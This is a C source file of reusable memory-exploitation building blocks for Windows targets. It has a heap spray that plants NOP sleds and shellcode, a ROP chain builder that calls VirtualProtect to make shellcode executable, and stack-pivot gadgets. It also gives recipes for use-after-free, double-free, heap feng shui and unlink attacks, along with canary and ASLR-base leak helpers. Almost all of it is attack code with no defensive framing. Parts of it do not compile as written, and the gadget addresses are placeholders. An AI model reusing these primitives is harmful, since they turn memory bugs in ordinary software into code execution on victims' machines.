/*
 * Stack/Heap - Memory exploitation patterns
 * Heap spray, UAF, overflow, ROP patterns
 */

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
typedef unsigned char  BYTE;
typedef unsigned int   DWORD;
typedef unsigned long long QWORD;
typedef void* PVOID;
#endif

// ============================================================================
// HEAP SPRAY - predictable address for exploitation
// ============================================================================

#define SPRAY_SIZE   0x10000     // 64KB per block
#define SPRAY_COUNT  0x100       // 256 blocks = 16MB
#define TARGET_ADDR  0x0C0C0C0C  // Classic target (x86)

// Spray block structure
typedef struct {
    BYTE  nops[SPRAY_SIZE - 0x100];  // NOP sled
    BYTE  shellcode[0x100];           // Payload
} SPRAY_BLOCK;

PVOID* g_spray_ptrs = NULL;

// Standard heap spray
void heap_spray(BYTE* sc, DWORD sclen)
{
    g_spray_ptrs = (PVOID*)HeapAlloc(GetProcessHeap(), 0, SPRAY_COUNT * sizeof(PVOID));

    for(DWORD i = 0; i < SPRAY_COUNT; i++) {
        SPRAY_BLOCK* blk = (SPRAY_BLOCK*)HeapAlloc(GetProcessHeap(), 0, sizeof(SPRAY_BLOCK));

        // Fill with NOP sled
        __stosb(blk->nops, 0x90, sizeof(blk->nops));

        // Copy shellcode at end
        __movsb(blk->shellcode, sc, sclen);

        g_spray_ptrs[i] = blk;
    }
}

void heap_spray_free()
{
    for(DWORD i = 0; i < SPRAY_COUNT; i++)
        HeapFree(GetProcessHeap(), 0, g_spray_ptrs[i]);
    HeapFree(GetProcessHeap(), 0, g_spray_ptrs);
}

// ============================================================================
// USE-AFTER-FREE PATTERN
// ============================================================================

// Vulnerable object with vtable
typedef struct {
    void (*vtable[4])(void);  // Function pointers
    BYTE  data[32];
} UAF_OBJ;

// Replacement object for exploitation
typedef struct {
    PVOID fake_vtable;        // Points to controlled data
    BYTE  shellcode[32];
} EVIL_OBJ;

/*
 * UAF exploitation pattern:
 *
 * 1. Allocate victim object with callbacks
 *    UAF_OBJ* obj = malloc(sizeof(UAF_OBJ));
 *    obj->vtable[0] = legit_func;
 *
 * 2. Free the object (but keep dangling pointer)
 *    free(obj);
 *
 * 3. Spray heap with controlled data same size
 *    EVIL_OBJ* evil = malloc(sizeof(EVIL_OBJ));
 *    evil->fake_vtable = shellcode_addr;
 *
 * 4. Trigger dangling pointer call
 *    obj->vtable[0]();  // Calls controlled address
 */

// ============================================================================
// DOUBLE-FREE PATTERN
// ============================================================================

/*
 * Double-free -> tcache/fastbin poisoning
 *
 * free(A);
 * free(B);
 * free(A);  // Double free - A back in freelist
 *
 * Freelist: A -> B -> A (circular)
 *
 * malloc() returns A
 * malloc() returns B
 * malloc() returns A again!
 *
 * Now two pointers to same chunk = arbitrary write
 */

// ============================================================================
// STACK BUFFER OVERFLOW
// ============================================================================

// Vulnerable function pattern
typedef struct {
    char  buffer[64];
    char  canary[8];      // Stack canary (if enabled)
    PVOID saved_rbp;
    PVOID ret_addr;       // Target for overwrite
} STACK_FRAME;

/*
 * Stack layout (x64):
 *
 * [buffer     64 bytes]
 * [canary      8 bytes]  <- Stack protector
 * [saved RBP   8 bytes]
 * [ret addr    8 bytes]  <- Overwrite target
 *
 * Overflow pattern:
 * [AAAA...64...AAAA][canary][BBBBBBBB][ROP_GADGET]
 *
 * Need canary leak first, or bypass
 */

// Calculate offset to ret addr
#define RET_OFFSET(buf) (sizeof(buf) + sizeof(PVOID) + sizeof(PVOID))

// ============================================================================
// ROP CHAIN STRUCTURES
// ============================================================================

// ROP chain for VirtualProtect (x64 Windows)
typedef struct {
    QWORD pop_rcx;        // Gadget: pop rcx; ret
    QWORD lpAddress;      // rcx = address to protect
    QWORD pop_rdx;        // Gadget: pop rdx; ret
    QWORD dwSize;         // rdx = size
    QWORD pop_r8;         // Gadget: pop r8; ret
    QWORD flNewProtect;   // r8 = 0x40 (RWX)
    QWORD pop_r9;         // Gadget: pop r9; ret
    QWORD lpflOldProtect; // r9 = writable addr
    QWORD VirtualProtect; // Call VirtualProtect
    QWORD shellcode_addr; // Return to shellcode
} ROP_CHAIN;

// Gadget addresses (would be found via ROP gadget finder)
#define GADGET_POP_RCX  0x7FF812345678
#define GADGET_POP_RDX  0x7FF812345680
#define GADGET_POP_R8   0x7FF812345688
#define GADGET_POP_R9   0x7FF812345690

// Build ROP chain
void build_rop(ROP_CHAIN* rop, PVOID sc_addr, DWORD sc_size, PVOID vp_addr)
{
    DWORD old;
    static DWORD s_old;  // Writable location for lpflOldProtect

    rop->pop_rcx = GADGET_POP_RCX;
    rop->lpAddress = (QWORD)sc_addr;

    rop->pop_rdx = GADGET_POP_RDX;
    rop->dwSize = sc_size;

    rop->pop_r8 = GADGET_POP_R8;
    rop->flNewProtect = 0x40;  // PAGE_EXECUTE_READWRITE

    rop->pop_r9 = GADGET_POP_R9;
    rop->lpflOldProtect = (QWORD)&s_old;

    rop->VirtualProtect = (QWORD)vp_addr;
    rop->shellcode_addr = (QWORD)sc_addr;
}

// ============================================================================
// STACK PIVOT
// ============================================================================

/*
 * Stack pivot gadgets:
 *
 * xchg eax, esp ; ret     ; ESP = EAX (controlled)
 * mov esp, eax ; ret      ; Same effect
 * leave ; ret             ; ESP = EBP (if EBP controlled)
 * add esp, 0x1000 ; ret   ; Jump over stack, land on heap spray
 *
 * Sequence:
 * 1. Control EIP/RIP via overflow
 * 2. EAX/RAX points to fake stack (heap spray)
 * 3. EIP -> "xchg eax, esp; ret"
 * 4. Now ESP points to fake stack with ROP chain
 */

// Fake stack structure for pivot
typedef struct {
    QWORD rop_chain[64];
    BYTE  shellcode[256];
} FAKE_STACK;

// ============================================================================
// HEAP FENG SHUI
// ============================================================================

/*
 * Heap layout manipulation:
 *
 * Goal: Place controlled data adjacent to victim object
 *
 * 1. Spray heap with objects of target size
 * 2. Free some to create holes
 * 3. Trigger vulnerable allocation -> lands in hole
 * 4. Overflow into adjacent controlled object
 *
 * Pattern:
 * alloc(A); alloc(B); alloc(C); alloc(D);
 * free(B);                    // Create hole
 * trigger_vuln_alloc();       // Lands where B was
 * overflow into C;            // Controlled data
 */

// Feng shui block
typedef struct {
    BYTE data[0x80];
    PVOID vtable;  // Target for overwrite
} FENG_BLOCK;

// ============================================================================
// LOW FRAGMENT HEAP EXPLOITATION (Windows)
// ============================================================================

/*
 * LFH bucket sizes (Windows):
 *
 * 1-16 bytes   -> 16 byte bucket
 * 17-32 bytes  -> 32 byte bucket
 * ...
 * 481-512 bytes -> 512 byte bucket
 *
 * After 17 allocations of same size, LFH activates
 * Allocations become randomized within bucket
 *
 * Spray 17+ allocations to trigger LFH
 * Then use adjacent chunk corruption
 */

#define LFH_THRESHOLD 17

void activate_lfh(DWORD size)
{
    for(int i = 0; i < LFH_THRESHOLD + 1; i++) {
        HeapAlloc(GetProcessHeap(), 0, size);
    }
}

// ============================================================================
// MEMORY GUARDS
// ============================================================================

// Canary check bypass
#define CANARY_OFFSET 64

QWORD leak_canary(BYTE* leak_buf, DWORD leak_len)
{
    // Format string or info leak gave us stack data
    // Canary is at known offset
    return *(QWORD*)(leak_buf + CANARY_OFFSET);
}

// ASLR bypass via info leak
QWORD leak_base(BYTE* leak_buf, DWORD leak_len)
{
    // Find pointer in leaked data
    // Calculate module base from RVA
    QWORD leaked_ptr = *(QWORD*)leak_buf;
    QWORD known_offset = 0x1234;  // RVA of leaked function
    return leaked_ptr - known_offset;
}

// ============================================================================
// CHUNK METADATA CORRUPTION
// ============================================================================

// HEAP_ENTRY structure (simplified)
typedef struct {
    WORD  Size;
    BYTE  Flags;
    BYTE  SmallTagIndex;
    WORD  PreviousSize;
    BYTE  SegmentOffset;
    BYTE  UnusedBytes;
} HEAP_ENTRY;

// Unlink attack (legacy, pre-safe unlinking)
/*
 * Corrupted chunk:
 * FD = target - 0x8
 * BK = shellcode_addr
 *
 * Unlink: [FD]->bk = BK
 *         [BK]->fd = FD
 *
 * Result: Writes shellcode_addr to target
 */

// ============================================================================
// MEMORY LAYOUT DETECTION
// ============================================================================

// Get stack boundaries (heuristic)
void get_stack_bounds(PVOID* low, PVOID* high)
{
    NT_TIB* tib = (NT_TIB*)__readgsqword(0x30);  // x64 TEB
    *low = tib->StackLimit;
    *high = tib->StackBase;
}

// Check if address is on stack
int is_stack_addr(PVOID addr)
{
    PVOID low, high;
    get_stack_bounds(&low, &high);
    return (addr >= low && addr < high);
}

// Check if address is in heap
int is_heap_addr(PVOID addr)
{
    // Heuristic: heap is typically in lower address range
    // More accurate: walk heap segments
    return ((QWORD)addr > 0x10000 && (QWORD)addr < 0x7FF000000000);
}

// ============================================================================
// EOF
// ============================================================================
